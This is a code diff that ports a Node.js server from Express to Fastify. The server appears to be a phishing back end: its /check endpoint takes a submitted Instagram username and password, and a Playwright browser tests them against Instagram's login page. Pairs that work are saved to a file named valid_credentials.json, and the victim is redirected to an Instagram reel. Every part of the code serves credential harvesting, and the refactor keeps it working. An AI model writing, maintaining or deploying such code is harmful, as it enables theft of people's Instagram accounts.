@@ -1,14 +1,13 @@
-const express = require("express");
+const Fastify = require("fastify");
 const { chromium } = require("playwright");
-const cors = require("cors");
 const fs = require("fs");
+const cors = require("@fastify/cors");
 
-const PORT = 30000;
+const PORT = process.env.PORT || 30000;
 const DATA_FILE = "valid_credentials.json";
 
-const app = express();
-app.use(express.json());
-app.use(cors());
+const app = Fastify();
+app.register(cors);
 
 function validateCredentials(username, password) {
     if (!username || !password) {
@@ -36,15 +35,14 @@ function saveCredentials(username, password) {
     fs.writeFileSync(DATA_FILE, JSON.stringify(credentials, null, 2));
 }
 
-app.post("/check", async (req, res) => {
-    console.log("Новый POST-запрос на /check", req.body);
+app.post("/check", async (request, reply) => {
+    console.log("Новый POST-запрос на /check", request.body);
 
-    const { username, password } = req.body;
-
+    const { username, password } = request.body;
     const validation = validateCredentials(username, password);
     if (!validation.valid) {
         console.log("Ошибка валидации:", validation.message);
-        return res.json({ error: true, message: validation.message });
+        return reply.send({ error: true, message: validation.message });
     }
 
     console.log(`Начинаем проверку логина для пользователя: ${username}`);
@@ -57,7 +55,6 @@ app.post("/check", async (req, res) => {
         console.log("Загружена страница авторизации...");
 
         await page.waitForSelector("input[name='username']", { timeout: 5000 });
-
         await page.fill("input[name='username']", username);
         await page.fill("input[name='password']", password);
         await page.click("button[type='submit']");
@@ -72,7 +69,7 @@ app.post("/check", async (req, res) => {
             if (errorMessage > 0) {
                 console.log("Ошибка входа: неверные данные.");
                 await browser.close();
-                return res.json({ error: true, message: "Неверный логин или пароль" });
+                return reply.send({ error: true, message: "Неверный логин или пароль" });
             }
 
             if (currentUrl !== "https://www.instagram.com/accounts/login/") {
@@ -86,23 +83,27 @@ app.post("/check", async (req, res) => {
         if (loginSuccess) {
             console.log(`Пользователь ${username} успешно вошел в аккаунт.`);
             saveCredentials(username, password);
-            return res.json({ error: false, message: "Успешный вход в Instagram", redirectUrl: "https://www.instagram.com/reel/DGZvsOutpww/?igsh=MWozYjZtbWhyeHZvaA==" });
+            return reply.send({ error: false, message: "Успешный вход в Instagram", redirectUrl: "https://www.instagram.com/reel/DGZvsOutpww/?igsh=MWozYjZtbWhyeHZvaA==" });
         } else {
             console.log("Ошибка входа: URL не изменился.");
-            return res.json({ error: true, message: "Неверный логин или пароль" });
+            return reply.send({ error: true, message: "Неверный логин или пароль" });
         }
     } catch (error) {
         console.error("Ошибка при входе в Instagram:", error);
         await browser.close();
-        return res.json({ error: true, message: "Ошибка сервера" });
+        return reply.send({ error: true, message: "Ошибка сервера" });
     }
 });
 
-app.get("/", (req, res) => {
+app.get("/", async (request, reply) => {
     console.log("Новый GET-запрос на /");
-    res.send("Сервер работает!");
+    reply.send("Сервер работает!");
 });
 
-app.listen(PORT, () => {
-    console.log(`Сервер запущен на порту ${PORT}`);
+app.listen({ port: PORT }, (err, address) => {
+    if (err) {
+        console.error("Ошибка запуска сервера:", err);
+        process.exit(1);
+    }
+    console.log(`Сервер запущен на ${address}`);
 });
